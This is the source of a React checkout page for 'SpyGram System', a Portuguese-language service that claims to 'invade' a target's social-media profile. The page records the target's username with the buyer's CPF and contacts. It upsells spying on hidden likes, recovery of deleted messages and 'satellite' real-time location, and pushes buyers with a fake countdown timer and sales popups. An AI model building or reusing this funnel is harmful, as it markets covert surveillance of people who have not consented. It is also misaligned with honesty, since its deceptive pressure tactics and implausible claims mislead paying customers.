import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ShoppingCart, ChevronRight, QrCode, ShieldCheck, Lock, Check } from 'lucide-react';
import SalesNotification from '../components/SalesNotification';
import PixPaymentDisplay from '../components/PixPaymentDisplay';
import { supabase } from '../integrations/supabase/client';
import toast from 'react-hot-toast';
import { trackLead } from '../services/trackingService';

const CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CPUD1S';

const maskCPFOrCNPJ = (value: string) => {
  const v = value.replace(/\D/g, '');
  if (v.length <= 11) {
    return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})/, '$1-$2').replace(/(-\d{2})\d+?$/, '$1');
  } else {
    return v.replace(/(\d{2})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1/$2').replace(/(\d{4})(\d{1,2})/, '$1-$2').replace(/(-\d{2})\d+?$/, '$1');
  }
};

const maskPhone = (value: string) => {
  const v = value.replace(/\D/g, '');
  return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2').replace(/(-\d{4})\d+?$/, '$1');
};

const CheckoutPage: React.FC = () => {
  const navigate = useNavigate();
  const [timeLeft, setTimeLeft] = useState(240); // 4 minutos
  const [isProcessing, setIsProcessing] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  
  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    confirmarEmail: '',
    whatsapp: '',
    documento: ''
  });
  
  const [bumps, setBumps] = useState({
    pro: false,
    social: false,
    recover: false,
    track: false
  });

  useEffect(() => {
    // Ao entrar na página, tenta manter o vínculo com o alvo pesquisado
    const invasionDataRaw = sessionStorage.getItem('invasionData');
    const invasionData = invasionDataRaw ? JSON.parse(invasionDataRaw) : null;

    // Se o lead foi deletado nesta sessão, não tentamos forçar o rastreio aqui
    if (sessionStorage.getItem('is_deleted_lead') !== 'true') {
      trackLead({ 
        status: 'checkout',
        username_searched: invasionData?.profileData?.username,
        profile_pic: invasionData?.profileData?.profilePicUrl
      });
    }
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTimer = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  };

  const basePrice = 29.90;
  const bumpDetails = {
    pro: { title: 'ACESSO VITALÍCIO PRO', price: 9.90, img: '/order-bumps/vitalicio.jpg', desc: 'Garanta seu acesso para sempre sem taxas.' },
    social: { title: 'ESPIÃO SOCIAL COMPLETO', price: 19.90, img: '/order-bumps/social.jpg', desc: 'Veja curtidas e seguidores ocultos.' },
    recover: { title: 'RECUPERADOR DE MENSAGENS', price: 15.90, img: '/order-bumps/recover.jpg', desc: 'Recupere o que foi apagado há meses.' },
    track: { title: 'RASTREAMENTO 24H', price: 15.90, img: '/order-bumps/track.jpg', desc: 'Localização em tempo real via satélite.' }
  };

  const adicionais = Object.keys(bumps).reduce((acc, key) => {
    return bumps[key as keyof typeof bumps] ? acc + (bumpDetails[key as keyof typeof bumpDetails]?.price || 0) : acc;
  }, 0);

  const total = basePrice + adicionais;

  const handleFinalize = async () => {
    if (!formData.nome || !formData.email || !formData.documento) {
        toast.error("Preencha todos os dados.");
        return;
    }

    setIsProcessing(true);
    const toastId = toast.loading("Gerando PIX...");

    const currentLeadId = sessionStorage.getItem('current_lead_id');
    const invasionDataRaw = sessionStorage.getItem('invasionData');
    const invasionData = invasionDataRaw ? JSON.parse(invasionDataRaw) : null;

    // Salvamento com os dados do alvo incluídos
    await trackLead({
      username_searched: invasionData?.profileData?.username,
      profile_pic: invasionData?.profileData?.profilePicUrl,
      email: formData.email,
      phone: formData.whatsapp,
      full_name: formData.nome,
      document: formData.documento,
      status: 'gerou_pix',
      amount: total
    });

    try {
        const { data, error } = await supabase.functions.invoke('royal-banking-payment', {
            body: { 
                name: formData.nome,
                email: formData.email,
                document: formData.documento,
                phone: formData.whatsapp,
                amount: total,
                leadId: currentLeadId
            },
        });

        if (error) throw error;

        if (data.paymentCode) {
            setPixData({
              paymentCode: data.paymentCode,
              paymentCodeBase64: data.paymentCodeBase64,
              idTransaction: data.idTransaction,
              amount: total,
              leadInfo: { 
                ...formData,
                username_searched: invasionData?.profileData?.username,
                profile_pic: invasionData?.profileData?.profilePicUrl
              }
            });
            toast.success("PIX Gerado!", { id: toastId });
        } else {
            window.location.href = CHECKOUT_URL;
        }

    } catch (err) {
        toast.error("Erro ao gerar PIX. Redirecionando...", { id: toastId });
        setTimeout(() => window.location.href = CHECKOUT_URL, 2000);
    } finally {
        setIsProcessing(false);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let maskedValue = value;
    if (name === 'documento') maskedValue = maskCPFOrCNPJ(value);
    else if (name === 'whatsapp') maskedValue = maskPhone(value);
    setFormData(prev => ({ ...prev, [name]: maskedValue }));
  };

  const toggleBump = (key: keyof typeof bumps) => {
    setBumps(prev => ({ ...prev, [key]: !prev[key] }));
  };

  if (pixData) {
    return (
      <div className="min-h-screen bg-[#f4f4f4] py-12 px-4">
        <PixPaymentDisplay 
          paymentCode={pixData.paymentCode}
          paymentCodeBase64={pixData.paymentCodeBase64}
          transactionId={pixData.idTransaction}
          amount={pixData.amount}
          leadData={pixData.leadInfo}
          onConfirm={() => toast.success("Aguardando confirmação...")}
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f4f4f4] text-[#333] font-sans">
      <SalesNotification />
      <div className="w-full bg-[#f15c5c] text-white py-2 text-center text-[11px] font-bold uppercase sticky top-0 z-50">
        VAGA GARANTIDA POR: <span className="ml-2 font-mono">{formatTimer(timeLeft)}</span>
      </div>

      <div className="max-w-xl mx-auto px-4 py-6">
        <img src="/banner-topo.png" alt="Banner Topo" className="w-full h-auto mb-6 rounded-lg shadow-sm" />

        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 space-y-8">
          <div>
            <h2 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-6 flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" /> 1. DADOS PESSOAIS
            </h2>
            <div className="grid grid-cols-1 gap-4">
              <input type="text" name="nome" value={formData.nome} onChange={handleChange} placeholder="Nome completo" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none focus:border-[#78cc6d] transition-all" />
              <input type="text" name="documento" value={formData.documento} onChange={handleChange} placeholder="CPF" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none focus:border-[#78cc6d] transition-all" />
              <input type="email" name="email" value={formData.email} onChange={handleChange} placeholder="E-mail" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none focus:border-[#78cc6d] transition-all" />
              <input type="email" name="confirmarEmail" value={formData.confirmarEmail} onChange={handleChange} placeholder="Confirmar e-mail" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none focus:border-[#78cc6d] transition-all" />
              <input type="tel" name="whatsapp" value={formData.whatsapp} onChange={handleChange} placeholder="Telefone com DDD" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none focus:border-[#78cc6d] transition-all" />
            </div>
          </div>

          <div>
            <h2 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-6 flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" /> 2. PAGAMENTO
            </h2>
            <div className="border-2 border-green-500 rounded-xl p-4 w-fit bg-white flex flex-col items-center gap-1 shadow-sm">
              <QrCode className="text-green-500 w-8 h-8" />
              <span className="text-[10px] font-black uppercase">PIX</span>
            </div>
          </div>

          <div className="space-y-4">
            <h2 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-4">OFERTAS EXCLUSIVAS</h2>
            
            {Object.entries(bumpDetails).map(([key, item]) => (
              <div 
                key={key}
                onClick={() => toggleBump(key as keyof typeof bumps)}
                className={`relative flex items-center gap-4 p-4 border-2 rounded-xl cursor-pointer transition-all ${bumps[key as keyof typeof bumps] ? 'border-[#78cc6d] bg-green-50' : 'border-gray-100 hover:border-gray-200'}`}
              >
                <div className="w-16 h-16 rounded-lg overflow-hidden flex-shrink-0">
                  <img src={item.img} alt={item.title} className="w-full h-full object-cover" />
                </div>
                <div className="flex-1">
                  <h3 className="text-[11px] font-black leading-tight mb-1">{item.title}</h3>
                  <p className="text-[9px] text-gray-500 leading-tight mb-1">{item.desc}</p>
                  <p className="text-xs font-bold text-[#78cc6d]">POR APENAS R$ {item.price.toFixed(2).replace('.', ',')}</p>
                </div>
                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center ${bumps[key as keyof typeof bumps] ? 'bg-[#78cc6d] border-[#78cc6d]' : 'border-gray-200'}`}>
                  {bumps[key as keyof typeof bumps] && <Check className="w-4 h-4 text-white" />}
                </div>
              </div>
            ))}
          </div>

          <div className="pt-4 border-t border-gray-100">
            <div className="flex justify-between items-center mb-6">
              <span className="text-gray-500 font-bold uppercase text-xs">Total a pagar:</span>
              <span className="text-2xl font-black text-gray-800">R$ {total.toFixed(2).replace('.', ',')}</span>
            </div>
            
            <button 
              onClick={handleFinalize} 
              disabled={isProcessing} 
              className="w-full bg-[#78cc6d] hover:bg-[#6ab961] text-white py-5 rounded-2xl font-black text-lg uppercase shadow-[0_4px_20px_rgba(120,204,109,0.3)] active:scale-95 transition-all flex items-center justify-center gap-2"
            >
              {isProcessing ? (
                <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              ) : (
                <>FINALIZAR COMPRA <ChevronRight className="w-5 h-5" /></>
              )}
            </button>
          </div>

          <div className="flex flex-col items-center gap-4 pt-4">
             <img src="/embaixodobanner.png" alt="Segurança" className="w-full h-auto opacity-80" />
             <div className="flex items-center gap-2 text-gray-400 text-[10px] font-bold uppercase">
               <ShieldCheck className="w-4 h-4" /> COMPRA 100% SEGURA E CRIPTOGRAFADA
             </div>
          </div>
        </div>

        <footer className="mt-8 text-center space-y-4">
          <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">© 2024 SpyGram System - All Rights Reserved</p>
        </footer>
      </div>
    </div>
  );
};

export default CheckoutPage;